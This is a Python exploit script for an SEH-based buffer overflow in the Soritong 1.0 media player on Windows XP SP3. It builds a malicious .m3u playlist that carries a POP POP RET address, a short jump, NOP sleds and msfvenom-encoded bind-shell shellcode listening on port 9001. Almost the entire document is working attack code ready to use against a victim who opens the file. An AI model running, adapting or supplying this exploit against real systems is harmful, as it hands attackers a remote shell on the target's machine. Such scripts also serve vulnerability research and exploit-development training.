# Exploit for Soritong 1.0 - SEH
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python

file = open("exploit.m3u", "wb")

# POP POP RET address in Player.dll = 0x1001af39
# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0d\x1a" -f python -v shellcode_bind

shellcode_bind =  b""
shellcode_bind += b"\xbf\x3e\xb3\xa1\xc4\xd9\xd0\xd9\x74\x24"
shellcode_bind += b"\xf4\x58\x31\xc9\xb1\x53\x31\x78\x12\x83"
shellcode_bind += b"\xc0\x04\x03\x46\xbd\x43\x31\x4a\x29\x01"
shellcode_bind += b"\xba\xb2\xaa\x66\x32\x57\x9b\xa6\x20\x1c"
shellcode_bind += b"\x8c\x16\x22\x70\x21\xdc\x66\x60\xb2\x90"
shellcode_bind += b"\xae\x87\x73\x1e\x89\xa6\x84\x33\xe9\xa9"
shellcode_bind += b"\x06\x4e\x3e\x09\x36\x81\x33\x48\x7f\xfc"
shellcode_bind += b"\xbe\x18\x28\x8a\x6d\x8c\x5d\xc6\xad\x27"
shellcode_bind += b"\x2d\xc6\xb5\xd4\xe6\xe9\x94\x4b\x7c\xb0"
shellcode_bind += b"\x36\x6a\x51\xc8\x7e\x74\xb6\xf5\xc9\x0f"
shellcode_bind += b"\x0c\x81\xcb\xd9\x5c\x6a\x67\x24\x51\x99"
shellcode_bind += b"\x79\x61\x56\x42\x0c\x9b\xa4\xff\x17\x58"
shellcode_bind += b"\xd6\xdb\x92\x7a\x70\xaf\x05\xa6\x80\x7c"
shellcode_bind += b"\xd3\x2d\x8e\xc9\x97\x69\x93\xcc\x74\x02"
shellcode_bind += b"\xaf\x45\x7b\xc4\x39\x1d\x58\xc0\x62\xc5"
shellcode_bind += b"\xc1\x51\xcf\xa8\xfe\x81\xb0\x15\x5b\xca"
shellcode_bind += b"\x5d\x41\xd6\x91\x09\xa6\xdb\x29\xca\xa0"
shellcode_bind += b"\x6c\x5a\xf8\x6f\xc7\xf4\xb0\xf8\xc1\x03"
shellcode_bind += b"\xb6\xd2\xb6\x9b\x49\xdd\xc6\xb2\x8d\x89"
shellcode_bind += b"\x96\xac\x24\xb2\x7c\x2c\xc8\x67\xe8\x24"
shellcode_bind += b"\x6f\xd8\x0f\xc9\xcf\x88\x8f\x61\xb8\xc2"
shellcode_bind += b"\x1f\x5e\xd8\xec\xf5\xf7\x71\x11\xf6\xd4"
shellcode_bind += b"\xa8\x9c\x10\x70\xbb\xc8\x8b\xec\x79\x2f"
shellcode_bind += b"\x04\x8b\x82\x05\x3c\x3b\xca\x4f\xfb\x44"
shellcode_bind += b"\xcb\x45\xab\xd2\x40\x8a\x6f\xc3\x56\x87"
shellcode_bind += b"\xc7\x94\xc1\x5d\x86\xd7\x70\x61\x83\x8f"
shellcode_bind += b"\x11\xf0\x48\x4f\x5f\xe9\xc6\x18\x08\xdf"
shellcode_bind += b"\x1e\xcc\xa4\x46\x89\xf2\x34\x1e\xf2\xb6"
shellcode_bind += b"\xe2\xe3\xfd\x37\x66\x5f\xda\x27\xbe\x60"
shellcode_bind += b"\x66\x13\x6e\x37\x30\xcd\xc8\xe1\xf2\xa7"
shellcode_bind += b"\x82\x5e\x5d\x2f\x52\xad\x5e\x29\x5b\xf8"
shellcode_bind += b"\x28\xd5\xea\x55\x6d\xea\xc3\x31\x79\x93"
shellcode_bind += b"\x39\xa2\x86\x4e\xfa\xc2\x64\x5a\xf7\x6a"
shellcode_bind += b"\x31\x0f\xba\xf6\xc2\xfa\xf9\x0e\x41\x0e"
shellcode_bind += b"\x82\xf4\x59\x7b\x87\xb1\xdd\x90\xf5\xaa"
shellcode_bind += b"\x8b\x96\xaa\xcb\x99"

nops = 30 * "\x90"

buffer = "A" * 260 + "\xeb\x14\x90\x90\x39\xaf\x01\x10" + nops + shellcode_bind + nops + "C" * (5000-264-8-len(shellcode_bind)-len(2*nops))

file.write(buffer)
file.close()
